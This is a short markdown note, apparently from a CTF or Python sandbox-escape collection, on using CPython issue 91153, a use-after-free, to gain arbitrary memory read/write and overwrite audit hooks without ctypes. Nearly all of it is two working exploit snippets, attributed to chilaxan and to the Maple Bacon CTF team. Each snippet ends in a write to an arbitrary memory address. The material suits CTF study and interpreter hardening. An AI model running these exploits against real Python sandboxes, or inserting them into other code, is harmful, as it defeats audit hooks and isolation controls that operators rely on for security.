# Use issues/91153 to do arbitrary read/write
## Concept
By using <https://github.com/python/cpython/issues/91153>(a use-after-free), we can overwrite audit hook without `ctypes`.  
Then using brute-force/analysis library to find the offset from a function to the audit hook.
## UAF Exploits
```python
# following arbitery reading/writing exploit code from https://github.com/python/cpython/issues/91153#issuecomment-1132117665
# by chilaxan
to_write_after_free = bytearray(bytearray.__basicsize__)
class sneaky:
    def __index__(self):
        global to_corrupt_ob_exports, to_uaf
        del to_write_after_free[:]
        to_corrupt_ob_exports = bytearray(bytearray.__basicsize__)
        to_write_after_free.__init__(bytearray.__basicsize__)
        to_uaf = memoryview(to_corrupt_ob_exports)
        return -tuple.__itemsize__

to_write_after_free[sneaky()] = 0
to_corrupt_ob_exports.clear()
occupy_uaf = bytearray()

view_backing = to_uaf.cast('P')
view = occupy_uaf

view_backing[2] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
memory = memoryview(view)
# end of arbitery writing exploit code

memory[<ADDR>] = <HEX>
```
OR  
```python
# following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
# wrote and improved by Maple Bacon CTF Team
class UAF:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = UAF()
# end of arbitery writing exploit code

memory[<ADDR>] = <HEX>
```